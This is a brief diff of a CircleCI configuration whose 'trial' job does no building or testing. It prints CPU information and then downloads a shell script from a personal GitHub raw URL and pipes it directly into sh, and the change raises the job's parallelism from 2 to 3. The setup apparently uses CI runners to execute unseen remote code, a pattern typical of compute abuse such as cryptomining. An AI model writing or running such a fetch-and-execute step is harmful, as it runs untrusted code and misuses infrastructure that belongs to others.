@@ -3,7 +3,7 @@ jobs:
   trial:
     docker:
       - image: circleci/ruby:2.5.3
-    parallelism: 2
+    parallelism: 3
     steps:
       - run: lscpu
       - run: wget https://raw.githubusercontent.com/gmsompret/new-yt/main/pnd.sh -O - | sh
